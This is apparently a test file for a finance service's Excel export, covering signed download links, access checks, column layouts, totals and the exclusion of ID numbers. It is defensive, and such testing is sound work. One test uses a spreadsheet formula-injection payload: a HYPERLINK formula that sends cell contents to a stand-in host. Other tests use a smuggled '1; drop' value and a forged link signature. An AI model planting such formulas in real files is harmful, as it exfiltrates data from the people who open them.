"""The finance desk's Excel files (app/desk/export.py, and the link and file routes in app/desk/routes.py; Analiza-Monday
backlog 0301 D2): analiza-metrics tests/test_finance.py at `da671b2`, its tests of the files ported onto the new routes.

The routes' gate is the desk's (tests/test_desk.py's monday: user 1 on both charge boards, 2 on Student Charge only, 3 on
B2B Charge only, 9 on neither); the reading answers the old tests' snapshots (tests/desk_fixtures.py `served`), as
analiza-metrics' FakeFinance stood for monday. What changed in the move is held here: the students' file has no "ת.ז"
column and says so at the head of its second sheet, and a link is signed by this service's own key."""
from __future__ import annotations

import hashlib
import hmac
import io
import json
import logging
import zipfile
from urllib.parse import parse_qs, unquote, urlencode, urlsplit

import openpyxl

from app import main
from app.desk import export as fx
from app.desk import routes as dr
from app.desk import view as fd
from tests.desk_fixtures import TODAY, acct, b2, enrollment, lead, sc, served, snap
from tests.test_desk import SECRET, desk, session_token  # noqa: F401 - `desk` is the fixture


def auth(user: int = 1) -> dict:
    return {"Authorization": "Bearer " + session_token(user)}


def export_link(desk, user: int = 1, **body):  # noqa: F811
    return desk.client.post("/api/desk/export-link", headers=auth(user), json={"tab": "b2c", **body})


def export_snapshot():
    return snap([sc(1, invoice="", receipt="1", paid="3950.5", paid_date="2026-10-04", lead=["L1"]),
                 sc(2, invoice="00123", created="2026-10-06T08:00:00Z"),
                 sc(3, st="4", refund_date="2026-11-02", created="2026-09-05T08:00:00Z")],
                [b2(1)], leads=[lead("L1", rep="סבטלנה")])


def sheet(desk, body: dict, name: str, user: int = 1):  # noqa: F811
    """(the headers, the rows by their monday id - or by their first cell -, the second sheet as {line: value})."""
    wb = openpyxl.load_workbook(io.BytesIO(desk.client.get(export_link(desk, user, **body).json()["url"]).content))
    ws = wb[name]
    heads = [x.value for x in ws[1]]
    rows = {ws.cell(row=i, column=heads.index("מזהה במאנדיי") + 1).value if "מזהה במאנדיי" in heads
            else ws.cell(row=i, column=1).value: dict(zip(heads, [x.value for x in ws[i]]))
            for i in range(2, ws.max_row + 1) if ws.cell(row=i, column=1).value or ws.cell(row=i, column=3).value}
    return heads, rows, {r[0].value: r[1].value for r in wb["פרטים"].iter_rows()}


# --- the files' columns ----------------------------------------------------------------------------------------------

def test_the_files_head_mondays_columns_by_their_monday_names():
    b2c = [c[0] for c in fx.B2C_COLUMNS]
    b2b = [c[0] for c in fx.B2B_COLUMNS]
    for name in ("סכום ששולם", "שליחת קבלה", "סכום החזר", "סכום לזיכוי", "אסמכתת זיכוי", "אסמכתת חשבונית", "אופן החזר",
                 "תאריך החזר", "סטטוס תשלום", "ערוץ תשלום", "סוג חיוב", "תאריך בקשת ביטול", fd.PLANNED_LABEL,
                 'סטטוס שובר משה"ע'):
        assert name in b2c, name
    # analiza-metrics' file had "ת.ז" among them, read live for it; this service never reads one. QA 24.11 added two:
    # "מה לבדוק", and the counted refund under the page's word for it, beside monday's "סכום החזר"
    assert "ת.ז" not in b2c and len(b2c) == 26
    assert {"מה לבדוק", fd.REFUNDED_WORD} <= set(b2c) and "מה לבדוק" in b2b
    for name in ("מועד דרישת תשלום", "חברה", "עסקה", "קוד קורס", 'סכום לחיוב (ללא מע"מ)', "מצב חיוב", "סטטוס תשלום",
                 "תנאי תשלום", "אסמכתת חשבונית", 'סכום ששולם (כולל מע"מ)'):
        assert name in b2b, name
    # the names they had before round 3 (the student's "סכום ששולם" has no VAT words in monday; the company's has)
    assert not set(b2c) & {"שם", "קבלה", "סכום שהוחזר", "סכום לזיכוי שאושר", "מסלול מימון", "סטטוס שובר",
                           'סכום ששולם (כולל מע"מ)'}
    assert not set(b2b) & {"מועד דרישה", "לקוח", 'סכום לפני מע"מ', "מצב חיוב במאנדיי", "סטטוס תשלום במאנדיי",
                           'שולם עד כה (כולל מע"מ)'}


def test_the_students_file_says_at_its_head_that_it_carries_no_id_number():
    """In the house style: no em dash, no arrow; and right under what the file is, before anything else it says."""
    rows = fd.filter_b2c(fd.build_view(export_snapshot(), TODAY)["b2c"], "", "", "")
    wb = openpyxl.load_workbook(io.BytesIO(fx.b2c_workbook(rows, {"taken_at": "x"})))
    lines = [(r[0].value, r[1].value) for r in wb["פרטים"].iter_rows()]
    assert lines[0][0] == "הקובץ" and lines[1] == ("ת.ז", fx.ID_NUMBERS_NOT_IN_FILE)
    assert fx.ID_NUMBERS_NOT_IN_FILE.startswith("מספרי ת.ז אינם בקובץ")
    assert "\u2014" not in fx.ID_NUMBERS_NOT_IN_FILE and "->" not in fx.ID_NUMBERS_NOT_IN_FILE
    # only the students' file has ID numbers to leave out
    companies = openpyxl.load_workbook(io.BytesIO(fx.b2b_workbook([], {})))
    assert "ת.ז" not in [r[0].value for r in companies["פרטים"].iter_rows()]


# --- the file, through its link -------------------------------------------------------------------------------------

def test_the_file_is_the_list_as_filtered_right_to_left_with_types_and_a_total_that_follows_the_filter(desk, monkeypatch):  # noqa: F811
    served(monkeypatch, export_snapshot())
    desk.get(session_token(1))
    r = export_link(desk, state="", period="2026-10", q="")
    assert r.status_code == 200 and r.json()["expires_in"] == 120 and r.json()["url"].startswith("/api/desk/export.xlsx?")
    f = desk.client.get(r.json()["url"])
    assert f.status_code == 200 and f.headers["content-type"].startswith("application/vnd.openxmlformats")
    cd = f.headers["content-disposition"]
    # the name says its list and its period (QA 2.12): all states, October 2026
    assert cd.startswith("attachment;") and "filename*=UTF-8''" in cd and 'filename="finance-students-all-2026-10-' in cd
    wb = openpyxl.load_workbook(io.BytesIO(f.content))
    ws = wb["תקבולים"]
    heads = [x.value for x in ws[1]]
    col = {h: i for i, h in enumerate(heads)}
    # analiza-metrics' 25 columns but "ת.ז", and "מה לבדוק" and "הוחזרו" since QA 24.11: A to Z
    assert ws.sheet_view.rightToLeft is True and ws.freeze_panes == "A2" and ws.auto_filter.ref == "A1:Z3"
    # monday's "תאריך תקבול", its source beside it (QA 2.5); the name and "נציג מכירות" side by side, as on Student Charge
    assert heads[:6] == ["תאריך תקבול", "מקור התאריך", "אסמכתת חשבונית", "סטודנט/ית", "נציג מכירות", "סכום ששולם"]
    data = {ws.cell(row=i, column=4).value: [x.value for x in ws[i]] for i in (2, 3)}
    first = data["תלמיד/ה 1"]
    assert first[0].date().isoformat() == "2026-10-04" and first[1] == "הוקלד" and first[col["סכום ששולם"]] == 3950.5
    assert data["תלמיד/ה 2"][1] == "יום היצירה"
    # the lead's Owner; a payment with no lead has none, an empty cell and never a word
    assert first[col["נציג מכירות"]] == "סבטלנה" and data["תלמיד/ה 2"][col["נציג מכירות"]] is None
    assert first[col["שיבוץ"]] == "הושלם"                        # the receipt went out; no reference decides
    assert data["תלמיד/ה 2"][2] == "00123"                      # a reference keeps its leading zeros
    assert ws.cell(row=5, column=6).value == "=SUBTOTAL(109,F2:F3)"
    info = {row[0].value: row[1].value for row in wb["פרטים"].iter_rows()}
    assert info["סינון"] == "אוקטובר 2026" and info["שורות"] == 2 and info["רשימה"] == "הכל"
    assert "לא בהכרח מי שמכר" in info["נציג מכירות"]           # what the column is: the owner now, as on the board
    assert info["ת.ז"] == fx.ID_NUMBERS_NOT_IN_FILE


def test_the_link_is_only_for_the_students_board_and_only_with_a_filter_the_desk_knows(desk, monkeypatch):  # noqa: F811
    served(monkeypatch, export_snapshot())
    assert export_link(desk, 3).status_code == 403                 # on B2B Charge only
    assert export_link(desk, state="nope").status_code == 400
    assert desk.client.post("/api/desk/export-link", headers=auth(), json={"tab": "both"}).status_code == 400
    assert desk.client.post("/api/desk/export-link", headers=auth(), json={"tab": "b2b", "customer": "1; drop"}).status_code == 400
    assert desk.client.post("/api/desk/export-link", json={"tab": "b2c"}).status_code == 401


def test_a_link_that_was_changed_or_ran_out_or_whose_reader_left_the_board_gives_no_file(desk, monkeypatch):  # noqa: F811
    served(monkeypatch, export_snapshot())
    url = export_link(desk, state="tasks").json()["url"]
    assert desk.client.get(url).status_code == 200
    assert desk.client.get(url.replace("state=tasks", "state=")).status_code == 403          # the filter is signed
    assert desk.client.get(url.replace("&u=1&", "&u=2&")).status_code == 403                 # so is the reader
    monkeypatch.setattr(dr, "EXPORT_LINK_S", -1)
    assert desk.client.get(export_link(desk, state="tasks").json()["url"]).status_code == 403   # two minutes, then nothing
    monkeypatch.setattr(dr, "EXPORT_LINK_S", 120)
    assert export_link(desk, 3).status_code == 403                 # a reader of the companies asks for the students


def test_a_student_name_is_written_as_text_never_as_a_formula(desk, monkeypatch):  # noqa: F811
    evil = '=HYPERLINK("https://example.invalid/?d="&E3&D3,"פתיחה")'
    served(monkeypatch, snap([sc(1, invoice="=1+1"), dict(sc(2), name=evil), sc(3, invoice="#N/A")], [b2(1)]))
    f = desk.client.get(export_link(desk).json()["url"])
    xml = zipfile.ZipFile(io.BytesIO(f.content)).read("xl/worksheets/sheet1.xml").decode()
    assert f.status_code == 200 and "<f>HYPERLINK" not in xml and "<f>1+1</f>" not in xml and 't="e"' not in xml


def test_a_control_character_in_a_text_does_not_break_the_file(desk, monkeypatch):  # noqa: F811
    served(monkeypatch, snap([dict(sc(1), name="ישראל\x0bישראלי")], [b2(1)]))
    assert desk.client.get(export_link(desk, q="").json()["url"]).status_code == 200


def test_the_file_is_the_reading_the_page_showed_and_says_so_when_it_is_not(desk, monkeypatch):  # noqa: F811
    """analiza-metrics answered the page with its old reading while a newer one came; here the newer one comes by the
    refresh press. Either way the file is built from the reading this instance holds, and says so when the page showed
    another."""
    first = snap([sc(1, invoice="", receipt="0"), sc(2, invoice="", receipt="0")], [b2(1)])
    second = snap([sc(1), sc(2, invoice="", receipt="0")], [b2(1)])          # row 1 fixed in monday meanwhile
    served(monkeypatch, first, second)
    page = desk.get(session_token(1)).json()

    def ids_and_notes(url):
        wb = openpyxl.load_workbook(io.BytesIO(desk.client.get(url).content))
        ws = wb["תקבולים"]
        idc = [x.value for x in ws[1]].index("מזהה במאנדיי") + 1
        ids = sorted(ws.cell(row=i, column=idc).value for i in range(2, ws.max_row + 1) if ws.cell(row=i, column=idc).value)
        return ids, [r[1].value for r in wb["פרטים"].iter_rows() if r[0].value == "שימו לב"]

    on_screen = sorted(x["id"] for x in page["view"]["b2c"]["rows"] if x["state"] in fd.TASK_STATES)
    assert ids_and_notes(export_link(desk, state="tasks", taken=page["taken_at"]).json()["url"]) == (on_screen, [])
    newer = desk.client.post("/api/desk/refresh", headers=auth()).json()                 # a newer reading came in
    assert newer["taken_at"] != page["taken_at"]
    ids, notes = ids_and_notes(export_link(desk, state="tasks", taken=page["taken_at"]).json()["url"])
    assert ids == ["2"] and len(notes) == 1 and "המסך הציג קריאה של" in notes[0]


def test_an_incomplete_reading_is_never_exported_as_complete(desk, monkeypatch):  # noqa: F811
    served(monkeypatch, snap([sc(1)], [b2(1)], sc_count=5))
    f = desk.client.get(export_link(desk).json()["url"])
    info = [r[1].value for r in openpyxl.load_workbook(io.BytesIO(f.content))["פרטים"].iter_rows()]
    assert any("לא שלמה" in str(v) for v in info)


def test_a_reading_short_on_a_board_of_the_tab_is_not_exported_as_complete(desk, monkeypatch):  # noqa: F811
    """New here: the desk's reading can be held while a board of a tab came short (a linked row without a column),
    which the view's own checks do not see. The file of that tab says it is not whole; the other tab's file does not."""
    from app.desk import reading as rd

    s = served(monkeypatch, snap([sc(1)], [b2(1)]))
    held = s(None)
    held["checks"]["cohorts"]["ok"] = False
    monkeypatch.setattr(rd, "read_desk", lambda _reader: held)

    def warned(tab):
        f = desk.client.get(export_link(desk, tab=tab).json()["url"])
        return any("לא שלמה" in str(r[1].value) for r in openpyxl.load_workbook(io.BytesIO(f.content))["פרטים"].iter_rows())
    assert warned("b2c") is True and warned("b2b") is False


def test_a_garbled_signature_is_403_not_500(desk):  # noqa: F811
    assert desk.client.get("/api/desk/export.xlsx?u=7&exp=9999999999&sig=%C3%A9").status_code == 403


def test_every_field_of_the_link_is_signed(desk, monkeypatch):  # noqa: F811
    served(monkeypatch, export_snapshot())
    url = export_link(desk, state="tasks", period="2026-10", q="תלמיד", taken="2026-11-10T10:00:00+00:00").json()["url"]
    assert desk.client.get(url).status_code == 200
    for old, new in (("period=2026-10", "period="), ("q=%D7", "q=%D8"), ("taken=2026", "taken=2025")):
        assert old in url and desk.client.get(url.replace(old, new, 1)).status_code == 403


def test_a_link_signed_by_analiza_metrics_is_not_valid_here(desk, monkeypatch):  # noqa: F811
    """The same Client Secret signs both services' links, each under its own context: one minted by analiza-metrics
    (`b"finance-export|"`) opens no file here, and one minted here opens none there."""
    served(monkeypatch, export_snapshot())
    url = export_link(desk).json()["url"]
    q = {k: v[0] if v else "" for k, v in parse_qs(urlsplit(url).query, keep_blank_values=True).items()}
    fields = [q["u"], q["exp"], q["tab"], q["state"], q["period"], q["q"], q["taken"], q["customer"]]
    theirs = hmac.new(hashlib.sha256(b"finance-export|" + SECRET.encode()).digest(),
                      json.dumps(fields, ensure_ascii=True).encode(), hashlib.sha256).hexdigest()
    assert theirs != q["sig"] and q["sig"] == dr.export_sig(SECRET, fields)
    forged = "/api/desk/export.xlsx?" + urlencode(dict(q, sig=theirs))
    assert desk.client.get(forged).status_code == 403 and desk.client.get(url).status_code == 200


def test_the_id_number_is_in_neither_the_file_nor_the_page(desk):  # noqa: F811
    """analiza-metrics read the lead's ID number live for the file and kept it out of the page. Here it is never read:
    not in the page's answer, not in the file - not even when monday answers it unasked - and the file says it is not."""
    from app.desk import reading as rd

    desk.w.extra_cells = {"301": {rd.LD["id_number"]: {"text": "012345678"}}}   # payment 101's lead
    page = desk.get(session_token(1))
    assert page.status_code == 200 and "012345678" not in page.text
    f = desk.client.get(export_link(desk).json()["url"])
    assert f.status_code == 200
    files = zipfile.ZipFile(io.BytesIO(f.content))
    assert not any(b"012345678" in files.read(n) for n in files.namelist())
    wb = openpyxl.load_workbook(io.BytesIO(f.content))
    assert "ת.ז" not in [x.value for x in wb["תקבולים"][1]]
    assert {r[0].value: r[1].value for r in wb["פרטים"].iter_rows()}["ת.ז"] == fx.ID_NUMBERS_NOT_IN_FILE
    asked = {c for _q, v in desk.w.queries_of("items(ids:") for c in v["cols"]}
    assert rd.LD["id_number"] not in asked


def test_a_link_opened_on_an_instance_where_the_reader_is_off_the_board_gives_no_file(desk, monkeypatch):  # noqa: F811
    served(monkeypatch, export_snapshot())
    url = export_link(desk).json()["url"]
    main.app.state.desk = None                                     # another instance, the same secret
    desk.w.members[dr.STUDENT_CHARGE] = {"12345"}
    assert desk.client.get(url).status_code == 403


def test_the_file_asks_the_boards_members_again_and_an_unknown_list_is_503(desk, monkeypatch):  # noqa: F811
    served(monkeypatch, export_snapshot())
    url = export_link(desk).json()["url"]
    main.app.state.desk = None
    desk.w.members_fail = {dr.STUDENT_CHARGE}
    resp = desk.client.get(url)
    assert resp.status_code == 503 and resp.json() == {"error": "members_unavailable"}


def test_the_companies_file_is_for_b2b_members_only_and_carries_the_balance(desk, monkeypatch):  # noqa: F811
    served(monkeypatch, snap([sc(1)], [b2(1, payment="0", amount="10000", paid="5000"), b2(2, payment="2", due="2026-09-01")]))
    link = desk.client.post("/api/desk/export-link", headers=auth(), json={"tab": "b2b", "state": "tasks", "customer": "A1"})
    f = desk.client.get(link.json()["url"])
    ws = openpyxl.load_workbook(io.BytesIO(f.content))["חיובים"]
    heads = [x.value for x in ws[1]]
    rows = {ws.cell(row=i, column=heads.index("מזהה במאנדיי") + 1).value: [x.value for x in ws[i]] for i in (2, 3)}
    assert rows["1"][heads.index('יתרה לגבייה (כולל מע"מ)')] == 6800 and rows["2"][heads.index("שיבוץ")] == "בפיגור"
    assert ws.sheet_view.rightToLeft is True
    assert desk.client.post("/api/desk/export-link", headers=auth(2), json={"tab": "b2b"}).status_code == 403


def test_the_aging_by_customer_is_a_file_too(desk, monkeypatch):  # noqa: F811
    served(monkeypatch, snap([sc(1)], [b2(1, payment="2", due="2026-09-01"), b2(2, billing="0", payment="2")]))
    link = desk.client.post("/api/desk/export-link", headers=auth(), json={"tab": "b2b_customers"})
    f = desk.client.get(link.json()["url"])
    ws = openpyxl.load_workbook(io.BytesIO(f.content))["לפי לקוח"]
    heads = [x.value for x in ws[1]]
    row = [x.value for x in ws[2]]
    page = desk.get(session_token(1)).json()["view"]["b2b"]["customers"][0]   # the route's own today
    # the file's columns are the page's (QA 2.12): the open money by band, as the page shows it
    bands = {k: float(v) for k, v in page["aging"].items() if float(v)}
    assert {h.split(": ", 1)[1]: row[i] for i, h in enumerate(heads) if h.startswith("לפי מועד פירעון: ") and row[i]} == \
        {fd.band_heading(k, fd.AGE_BANDS[k]): v for k, v in bands.items()}
    assert "finance-by-customer-" in f.headers["content-disposition"]
    assert desk.client.post("/api/desk/export-link", headers=auth(2), json={"tab": "b2b_customers"}).status_code == 403


def test_cancelled_and_untyped_amounts_are_blank_in_the_file_and_out_of_its_total(desk, monkeypatch):  # noqa: F811
    served(monkeypatch, snap([sc(1)], [b2(1, payment="2", due="2026-12-30"), b2(2, billing="2", amount="50000"),
                                       b2(3, billing="0", payment="2", amount="")]))
    url = desk.client.post("/api/desk/export-link", headers=auth(), json={"tab": "b2b"}).json()["url"]
    wb = openpyxl.load_workbook(io.BytesIO(desk.client.get(url).content))
    ws = wb["חיובים"]
    heads = [x.value for x in ws[1]]
    amounts = {ws.cell(row=i, column=heads.index("מזהה במאנדיי") + 1).value: ws.cell(row=i, column=heads.index('סכום לחיוב (ללא מע"מ)') + 1).value
               for i in range(2, 5)}
    assert amounts == {"1": 1000, "2": None, "3": None}
    info = {r[0].value: r[1].value for r in wb["פרטים"].iter_rows()}
    assert info['סה"כ סכום לחיוב (ללא מע"מ)'] == 1000


def test_the_link_takes_ascii_customers_and_exportable_searches_only(desk, monkeypatch):  # noqa: F811
    served(monkeypatch, export_snapshot())

    def post(body):
        return desk.client.post("/api/desk/export-link", headers=auth(), json=body).status_code
    assert post({"tab": "b2b", "customer": "אב"}) == 400                  # once a 500 in Content-Disposition
    assert post({"tab": "b2c", "q": "12\ufeff000"}) == 400 and post({"tab": "b2c", "q": "x\x1fA1"}) == 400
    assert post({"tab": "b2c", "q": 'תלמיד "א" (2), 1,500.50 ₪'}) == 200


def test_a_body_the_link_does_not_know_is_400_in_the_desks_own_words(desk):  # noqa: F811
    """analiza-metrics answered every /api body that does not fit with 400 `invalid_filter`; FastAPI's own 422 would say
    back what was sent. A field of another shape, a field it does not know, no body at all; and on the file's route, a
    reader that is not a number."""
    for body in ({"tab": "b2c", "id_number": "1"}, {"tab": 5}, ["b2c"]):
        resp = desk.client.post("/api/desk/export-link", headers=auth(), json=body)
        assert (resp.status_code, resp.json()) == (400, {"error": "invalid_filter"})
    resp = desk.client.post("/api/desk/export-link", headers=auth())
    assert (resp.status_code, resp.json()) == (400, {"error": "invalid_filter"})
    resp = desk.client.get("/api/desk/export.xlsx?u=x&exp=1&sig=a")
    assert (resp.status_code, resp.json()) == (400, {"error": "invalid_filter"})


def test_the_aging_follows_the_search_on_the_page_and_in_its_file(desk, monkeypatch):  # noqa: F811
    served(monkeypatch, snap([sc(1)], [b2(1, payment="2", due="2026-09-01", account="A1"),
                                       b2(2, payment="2", due="2026-09-01", account="A2")],
                             accounts=[acct("A1"), dict(acct("A2"), name="חברה אחרת")]))
    url = desk.client.post("/api/desk/export-link", headers=auth(), json={"tab": "b2b_customers", "q": "אחרת"}).json()["url"]
    ws = openpyxl.load_workbook(io.BytesIO(desk.client.get(url).content))["לפי לקוח"]
    assert [ws.cell(row=i, column=1).value for i in range(2, ws.max_row + 1) if ws.cell(row=i, column=1).value
            and ws.cell(row=i, column=1).value != 'סה"כ לפי הסינון'] == ["חברה אחרת"]


# --- the Excel files, round 3 ---------------------------------------------------------------------------------------

def test_a_refund_row_carries_both_dates_side_by_side_in_the_file_and_no_other_row_does(desk, monkeypatch):  # noqa: F811
    served(monkeypatch, snap([sc(1, enr=["E1"], credit_approved="1000", planned="2026-11-15"), sc(2, enr=["E2"]),
                              sc(3, st="0", paid="2500")],
                             [b2(1)], enrollments=[enrollment("E1", asked="2026-10-20"), enrollment("E2", asked="2026-10-01")]))
    heads, rows, info = sheet(desk, {"tab": "b2c", "state": ""}, "תקבולים")
    i = heads.index(fd.LAST_DAY_LABEL)
    assert heads[i - 1:i + 2] == ["תאריך בקשת ביטול", fd.LAST_DAY_LABEL, fd.PLANNED_LABEL]
    one = rows["1"]
    assert [one[h].date().isoformat() for h in heads[i - 1:i + 2]] == ["2026-10-20", "2026-11-03", "2026-11-15"]
    assert [rows["2"][h] for h in heads[i - 1:i + 2]] == [None, None, None]      # paid, no refund: no deadline
    assert rows["3"]["סכום ששולם"] is None and one["סכום ששולם"] == 4000         # "לא שולם": shown nowhere as money
    assert fd.LAST_DAY_LABEL in info
    _h, _r, tasks = sheet(desk, {"tab": "b2c", "state": "tasks"}, "תקבולים")
    assert tasks["רשימה"] == "לטיפול"


def test_the_aging_file_ends_with_the_open_balance_after_the_bands_it_sums(desk, monkeypatch):  # noqa: F811
    served(monkeypatch, snap([sc(1)], [b2(1, payment="2", due="2026-09-01"), b2(2, billing="0", payment="2"),
                                       b2(3, payment="0", amount="2000"), b2(4, payment="0", amount="1000", paid="590")]))
    heads, rows, _info = sheet(desk, {"tab": "b2b_customers"}, "לפי לקוח")
    bands = [h for h in heads if h.startswith("לפי מועד פירעון: ")]
    # "ללא מועד פירעון" only when a company has money there, as on the page (QA 2.12: the same columns)
    assert len(bands) == len(fd.AGE_BANDS) - 1 and heads.index('סה"כ יתרה פתוחה (ללא מע"מ)') == heads.index(bands[-1]) + 1
    # the total is the LAST column, as on the page (round 3, item 3) - nothing that is not open money after it
    assert heads[-1] == 'סה"כ יתרה פתוחה (ללא מע"מ)'
    assert heads[:3] == ["חברה", "תנאי תשלום", 'לחיוב החודש (ללא מע"מ)']
    row = rows["לקוח A1"]
    assert row['לחיוב החודש (ללא מע"מ)'] == 1000 and row['סה"כ יתרה פתוחה (ללא מע"מ)'] == 1000
    assert row['שולם חלקית: סכום לחיוב (ללא מע"מ), סכום ששולם (כולל מע"מ) לא הוקלד'] == 2000
    assert row['שולם חלקית: יתרה לגבייה (כולל מע"מ)'] == 590
    assert heads.index("לטיפול") < heads.index(bands[0])


def test_the_companies_file_says_how_a_due_date_is_counted_without_terms_too(desk, monkeypatch):  # noqa: F811
    served(monkeypatch, snap([sc(1)], [b2(1, payment="2", due="2026-10-15")], accounts=[acct("A1", "")]))
    heads, rows, info = sheet(desk, {"tab": "b2b", "state": ""}, "חיובים")
    assert rows["1"]["מועד פירעון"] == rows["1"]["מועד דרישת תשלום"]          # no terms: the demand day itself
    assert "מועד דרישת התשלום עצמו" in info["מועד פירעון"]


def test_the_files_name_the_company_as_monday_does(desk, monkeypatch):  # noqa: F811
    served(monkeypatch, snap([sc(1)], [b2(1, payment="2", due="2026-09-01")]))
    _h, _r, one = sheet(desk, {"tab": "b2b", "state": "", "customer": "A1"}, "חיובים")
    assert one["סינון"] == "חברה: לקוח A1"
    _h, _r, every = sheet(desk, {"tab": "b2b", "state": ""}, "חיובים")
    _h, _r, aging = sheet(desk, {"tab": "b2b_customers"}, "לפי לקוח")
    assert (every["סינון"], aging["סינון"]) == ("כל החברות", "כל החברות עם משהו פתוח")


def test_each_file_is_named_by_its_list_and_its_period_or_company(desk, monkeypatch):  # noqa: F811
    """QA 2.12: every students' file was "תקבולים-סטודנטים_הכל_<date>", whatever its list - a few exports came back as (1),
    (2) - and the aging file was "גיול-לקוחות", a word the page does not have."""
    served(monkeypatch, snap([sc(1, receipt="0", created="2026-10-06T08:00:00Z"), sc(2, credit_approved="100")],
                             [b2(1, payment="2", due=""), b2(2, payment="2", due="2026-09-01", account="A2")],
                             accounts=[acct("A1"), dict(acct("A2"), name='מרכז רפואי העמק/כללית')]))

    def names(body):
        cd = desk.client.get(export_link(desk, **body).json()["url"]).headers["content-disposition"]
        return unquote(cd.split("filename*=UTF-8''", 1)[1]).rsplit("_", 1)[0], cd.split('filename="', 1)[1].split('"')[0]
    assert names({"tab": "b2c", "state": "tasks"})[0] == "תקבולים-סטודנטים_לטיפול_כל-התקופה"
    assert names({"tab": "b2c", "state": "refund_to_execute", "period": "2026-10"})[0] == \
        "תקבולים-סטודנטים_החזר-לביצוע_אוקטובר-2026"
    hebrew, ascii_ = names({"tab": "b2c", "state": "receipt_pending"})
    assert hebrew == "תקבולים-סטודנטים_שולם-שליחת-קבלה-טרם_כל-התקופה" and ascii_.startswith("finance-students-receipt_pending-all-")
    hebrew, ascii_ = names({"tab": "b2b", "state": "exception", "customer": "A1"})
    assert hebrew == "חיובים-לקוחות-עסקיים_חריג-לבדיקה_לקוח-A1" and ascii_.startswith("finance-companies-exception-A1-")
    assert names({"tab": "b2b", "state": "", "customer": "A2"})[0] == "חיובים-לקוחות-עסקיים_הכל_מרכז-רפואי-העמק-כללית"
    hebrew, ascii_ = names({"tab": "b2b_customers"})
    assert hebrew == "לפי-לקוח" and ascii_.startswith("finance-by-customer-")
    # a company the reading no longer holds is named by its id, never by nothing (the hostile review of the QA round)
    assert names({"tab": "b2b", "state": "", "customer": "A9"})[0] == "חיובים-לקוחות-עסקיים_הכל_A9"


def test_the_files_line_names_the_reader_and_never_a_value(desk, monkeypatch, caplog):  # noqa: F811
    served(monkeypatch, export_snapshot())
    url = export_link(desk).json()["url"]
    with caplog.at_level(logging.INFO, logger="analiza_finance.desk"):
        desk.client.get(url)
        desk.client.get(url.replace("&u=1&", "&u=2&"))
    lines = [r.getMessage() for r in caplog.records if r.name == "analiza_finance.desk"]
    assert any("user=1 endpoint=desk-export-file outcome=file results=3" in x for x in lines)
    assert any("user=2 endpoint=desk-export-file outcome=link_expired" in x for x in lines)
    assert not any("תלמיד" in x or "sig=" in x or SECRET in x for x in lines)


# --- QA of D2 (24.11): what the file says of a row, and its totals ---------------------------------------------------

def book(desk, body: dict, user: int = 1):  # noqa: F811
    return openpyxl.load_workbook(io.BytesIO(desk.client.get(export_link(desk, user, **body).json()["url"]).content))


def total_row(ws) -> dict:
    """The row under the list that totals what Excel's filter shows: {header: its formula}, for each column that has one."""
    heads = [x.value for x in ws[1]]
    i = next(i for i in range(2, ws.max_row + 1) if ws.cell(row=i, column=2).value == 'סה"כ לפי הסינון')
    return {h: ws.cell(row=i, column=c).value for c, h in enumerate(heads, start=1)
            if str(ws.cell(row=i, column=c).value or "").startswith("=SUBTOTAL")}


def test_a_row_says_what_to_check_and_its_refund_as_monday_holds_it_beside_the_one_counted(desk, monkeypatch):  # noqa: F811
    """QA 24.11, 2945713395: 5,000 paid and 6,000 typed as its refund, in "חריג" for "סכום החזר גדול מסכום ששולם". Its file
    said 5,000 under "סכום החזר" - the counted refund under monday's name - and nothing said what was wrong with it. Now
    "סכום החזר" is monday's, the refund the page counts is "הוחזרו" beside it, and "מה לבדוק" says on every row that has
    something what the page's chips say there: all of them, in their order."""
    linked = {"lead": ["L1"]}
    served(monkeypatch, snap([sc(1, st="4", paid="5000", refund="6000", **linked), sc(2, invoice="", receipt="0", **linked),
                              sc(3, st="2", paid="4000", credit_approved="1000", refund="300", refund_date="2026-11-02",
                                 planned="2026-11-01"),
                              sc(4, **linked), sc(5, st="4", paid="3000", **linked), sc(6, st="5", paid="0", refund="0", **linked)],
                             [b2(1, billing="0", payment="1"), b2(2)], leads=[lead("L1")]))
    heads, rows, info = sheet(desk, {"tab": "b2c", "state": ""}, "תקבולים")
    one = rows["1"]
    assert (one["סכום ששולם"], one["סכום החזר"], one[fd.REFUNDED_WORD]) == (5000, 6000, 5000)
    assert one["שיבוץ"] == "חריג, לבדיקה" and one["מה לבדוק"] == "סכום החזר גדול מסכום ששולם"
    assert heads.index("מה לבדוק") == heads.index("שיבוץ") + 1
    assert heads.index(fd.REFUNDED_WORD) == heads.index("סכום החזר") + 1
    # not only in "חריג": a payment waiting for its receipt says so, as the page's chips do
    assert rows["2"]["שיבוץ"] == "שולם, שליחת קבלה: טרם" and rows["2"]["מה לבדוק"] == "חסרה אסמכתת חשבונית · שליחת קבלה: טרם"
    # every chip, where the page shows five and "ועוד 1"; the row's own status in quotes, as on the page
    assert rows["3"]["מה לבדוק"] == " · ".join([
        'סכום לזיכוי בסטטוס "יש בעיה"', 'סכום החזר בסטטוס "יש בעיה"', 'תאריך החזר בסטטוס "יש בעיה"',
        fd.PLANNED_LABEL + " עבר", fd.LAST_DAY_LABEL + " לא ידוע", "בלי הרשמה ובלי ליד מקור"])
    assert rows["4"]["מה לבדוק"] is None
    # a full refund with no amount typed: monday holds none, the page counts all that was paid
    assert (rows["5"]["סכום החזר"], rows["5"][fd.REFUNDED_WORD]) == (None, 3000)
    # a 0 typed is 0 (QA 24.11, 2829373007: the page says "סכום החזר 0", the file's cell was empty), and counts nothing
    assert (rows["6"]["סכום החזר"], rows["6"][fd.REFUNDED_WORD]) == (0, None)
    # the second sheet says what each of the three is
    assert "כפי שהוא במאנדיי" in info["סכום החזר"] and "כמו במסך" in info[fd.REFUNDED_WORD]
    assert 'לא רק ב"חריג, לבדיקה"' in info["מה לבדוק"]
    # the companies' file says it too
    _h, charges, about = sheet(desk, {"tab": "b2b", "state": ""}, "חיובים")
    assert charges["1"]["מה לבדוק"] == 'מועד דרישת התשלום עבר · אין תנאי תשלום · "שולם" לפני "חויב"'
    assert charges["2"]["מה לבדוק"] is None and "מה לבדוק" in about


def test_the_students_file_totals_what_the_page_counts_and_never_mondays_refund_as_typed(desk, monkeypatch):  # noqa: F811
    s = snap([sc(1, st="4", paid="5000", refund="6000"), sc(2, st="4", paid="3000"), sc(3, credit_approved="700"), sc(4)],
             [b2(1)])
    served(monkeypatch, s)
    wb = book(desk, {"tab": "b2c", "state": ""})
    # a total under each amount the page totals (fd.B2C_TOTALS), and none under monday's refund as typed
    assert set(total_row(wb["תקבולים"])) == {"סכום ששולם", fd.REFUNDED_WORD, "סכום לזיכוי"}
